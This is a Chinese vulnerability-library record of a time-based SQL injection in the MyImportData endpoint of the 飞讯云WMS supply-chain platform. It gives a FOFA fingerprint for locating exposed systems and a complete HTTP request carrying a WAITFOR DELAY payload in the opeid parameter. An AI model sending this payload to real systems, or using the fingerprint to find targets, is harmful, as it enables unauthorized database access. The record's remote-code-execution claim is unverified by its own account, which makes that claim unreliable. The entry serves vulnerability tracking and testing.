---
source: "wy876 漏洞文库"
title: "飞讯云WMS/供应链平台 MyImportData opeid时间SQL 注入"
product: "飞讯云WMS/供应链平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，MSSQL WAITFOR"
prerequisites: "声称前台但带JSESSIONID"
side_effects: "命令/代码执行示例可能改变主机状态；延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/rldp6r4s4n2hly4z"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%A3%9E%E8%AE%AF%E4%BA%91/%E9%A3%9E%E8%AE%AF%E4%BA%91%E4%BE%9B%E5%BA%94%E9%93%BE%E5%B9%B3%E5%8F%B0MyImportData%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5.md"
fofa: "icon_hash=\"-2088130336\""
fofa_unverified: "icon_hash="
id: "vw-97b9fdfb30868842e83d4ac0"
entity_id: "ve-97b9fdfb30868842e83d4ac0"
schema_version: "1"
---

# 飞讯云WMS/供应链平台 MyImportData opeid时间SQL 注入

## 条目说明

- 对象与具体问题：飞讯云WMS/供应链平台；MyImportData opeid时间SQLi
- 版本、配置及部署条件：未知版本，MSSQL WAITFOR
- 认证与权限前提：声称前台但带JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA两个反引号表达式相连无逻辑连接符，需明确AND/OR意图；标题ke一残片
- 只有延迟请求无响应，RCE后果未证明；缺版本修复

## 操作风险

命令/代码执行示例可能改变主机状态；延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## ke一、漏洞简介
WMS系统是借助条码、移动设备、互联网等技术实现仓库收、发、存等作业流程的自动化、和数字化的信息管理系统，旨在帮助客户解决库存分类管理和实时监控、仓库延迟录入和账务不符、仓储作业效率和作业合规、物料批次管理和库存库龄预警等问题，实现降低内部存货风险，提高企业的资金流转，促进产、销、供与财务端间的有效协同和提升仓库库容率和仓储运作效率的目标。 飞讯云WMS系统存在SQL注入，成功利用该漏洞可获取敏感信息，造成远程代码执行。

## 二、影响版本
+ 飞讯云WMS

## 三、资产测绘
+ fofa`icon_hash="-2088130336"``body="wx8ccb75857bd3e985"`
+ 特征


## 四、漏洞复现
```http
GET /MyDown/MyImportData?opeid=%27+WAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Cookie: JSESSIONID=8**********************************3; Language=zh-CN
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rldp6r4s4n2hly4z>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
